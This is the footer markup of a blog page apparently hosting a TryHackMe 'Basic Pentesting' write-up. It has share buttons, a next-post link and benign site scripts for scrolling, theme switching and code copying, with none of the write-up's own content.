<a class=next href=https://umar0x01.sh/post/ignite-thm/><span class=title>Next Page ¬ª</span><br><span>TryHackMe - Ignite</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Basic Pentesting on twitter" href="https://twitter.com/intent/tweet/?text=TryHackMe%20-%20Basic%20Pentesting&url=https%3a%2f%2fumar0x01.sh%2fpost%2fthm-basic_pentesting%2f&hashtags=ssh%2chttp%2csmb%2cnmap%2cgobuster%2cbruteforcing%2ccracking%2clinpeas%2cprivesc%2cstruts2%2csuid3num%2copenssl"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Basic Pentesting on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fumar0x01.sh%2fpost%2fthm-basic_pentesting%2f&title=TryHackMe%20-%20Basic%20Pentesting&summary=TryHackMe%20-%20Basic%20Pentesting&source=https%3a%2f%2fumar0x01.sh%2fpost%2fthm-basic_pentesting%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Basic Pentesting on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fumar0x01.sh%2fpost%2fthm-basic_pentesting%2f&title=TryHackMe%20-%20Basic%20Pentesting"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Basic Pentesting on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fumar0x01.sh%2fpost%2fthm-basic_pentesting%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Basic Pentesting on whatsapp" href="https://api.whatsapp.com/send?text=TryHackMe%20-%20Basic%20Pentesting%20-%20https%3a%2f%2fumar0x01.sh%2fpost%2fthm-basic_pentesting%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Basic Pentesting on telegram" href="https://telegram.me/share/url?text=TryHackMe%20-%20Basic%20Pentesting&url=https%3a%2f%2fumar0x01.sh%2fpost%2fthm-basic_pentesting%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2021 <a href=https://twitter.com/syed__umar target=_blank>@syed__umar</a></span>
<span>&#183;</span>
<span>Powered by <a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>window.onload=function(){localStorage.getItem("menu-scroll-position")&&(document.getElementById('menu').scrollLeft=localStorage.getItem("menu-scroll-position"))};function menu_on_scroll(){localStorage.setItem("menu-scroll-position",document.getElementById('menu').scrollLeft)}document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script><script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script></body></html>